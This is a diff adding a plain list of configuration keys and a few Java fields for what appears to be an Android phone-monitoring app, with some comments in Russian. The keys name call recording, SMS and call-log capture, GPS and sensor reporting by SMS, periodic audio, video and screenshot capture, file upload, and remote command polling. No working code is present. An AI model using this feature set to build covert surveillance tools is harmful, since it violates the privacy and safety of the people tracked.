@@ -1,0 +1,139 @@
+
+ Полные тексты	
+PHONE_UNIC_ID
+AUTH
+VERSION_APP
+UPD_INFO_PHONE
+CHECK_COMPARE_SIM
+
+	ADMIN_PHONE_NUMBER
+
+	c_mic_swith
+
+	option_write_voice_call
+	option_write_sms_log
+	option_write_call_log
+
+	option_send_accel_from_sms
+	option_send_battery_from_sms
+	option_send_light_from_sms
+	option_send_temperature_from_sms
+	option_send_celllocation_from_sms
+	option_send_gps_from_sms
+	option_send_param_sms
+	option_send_accel
+	option_send_battery
+	option_send_light
+	option_send_temperature
+	option_send_gps
+	option_send_param
+
+time_start_record_audio
+time_start_play_audio
+filename_audio_file
+time_vibration
+time_start_vibration
+
+	c_get_list_audio_values
+	c_set_new_audio_values
+
+	STREAM_MUSIC_NEW
+	STREAM_SYSTEM_NEW
+	STREAM_ALARM_NEW
+	STREAM_DTMF_NEW
+	STREAM_NOTIFICATION_NEW
+	STREAM_VOICE_CALL_NEW
+	STREAM_RING_NEW
+
+	c_get_list_call
+	c_get_list_contact
+	c_update_list_call
+	c_update_list_contact
+	c_update_list_sensors
+
+	c_set_wallpaper
+
+	period_send_sms
+	period_wait_internet
+	old_check_internet
+	old_check_success_internet
+	period_record_audio
+	period_record_video
+	period_record_screenshot
+	period_get_values_phone
+	period_get_command
+	period_save_log
+	period_upload_files
+	period_download_files
+period_check_gps
+period_old_check_gps
+period_check_battery
+period_check_temperature
+period_check_light
+period_check_accel
+period_wait_gps
+period_turn_on_gps
+period_turn_off_gps
+period_wait_sensors
+period_turn_on_sensors
+period_turn_off_sensors
+
+	create_photo_if_exist_face
+	alert_max_move_location
+	alert_max_speed_location
+	alert_max_level_mic
+
+	alert_incoming_call
+	alert_incoming_call_number_1
+	alert_incoming_call_number_2
+	alert_incoming_call_number_3
+	alert_incoming_call_number_4
+	alert_incoming_call_number_5
+
+	alert_incoming_sms
+	alert_incoming_sms_number_1
+	alert_incoming_sms_number_2
+	alert_incoming_sms_number_3
+	alert_incoming_sms_number_4
+	alert_incoming_sms_number_5
+
+	alert_incoming_sms_text_1
+	alert_incoming_sms_text_2
+	alert_incoming_sms_text_3
+	alert_incoming_sms_text_4
+	alert_incoming_sms_text_5
+	alert_incoming_sms_text_6
+	alert_incoming_sms_text_7
+	alert_incoming_sms_text_8
+	alert_incoming_sms_text_9
+	alert_incoming_sms_text_10
+
+	alert_outgoing_call
+	alert_outgoing_call_number_1
+	alert_outgoing_call_number_2
+	alert_outgoing_call_number_3
+	alert_outgoing_call_number_4
+	alert_outgoing_call_number_5
+
+добавить в настройки новые значение
+
+	//API Android
+	public static int getAPIlevel= 0 ;
+	public static String getRELEASE = ""; //NEW
+	public static String getBRAND = ""; //NEW
+	public static String getMODEL = ""; //NEW
+	
+	//OLD ADD TO LOG SENSORS
+	public static int oldAddToLOGsensorTemp = 0 ;
+	public static int oldAddToLOGsensorLight = 0 ;
+	public static int oldAddToLOGsensorAccel = 0 ;
+	public static int oldAddToLOGsensorGPS = 0 ;
+	
+	//УВЕДОМЛЕНИЕ ПО СМС О МИНИМАЛЬНОМ УРОВНЕ ЗАРЯДА БАТАРЕИ
+	public static int sendSMSminimumBatteryLevel = 0 ;
+	public static int minimumBatteryLevel = 15 ;
+	
+	и
+	
+	public static int AlertIncSMSText;
+	public static int oldTimeSendFiles = 0; //NEW
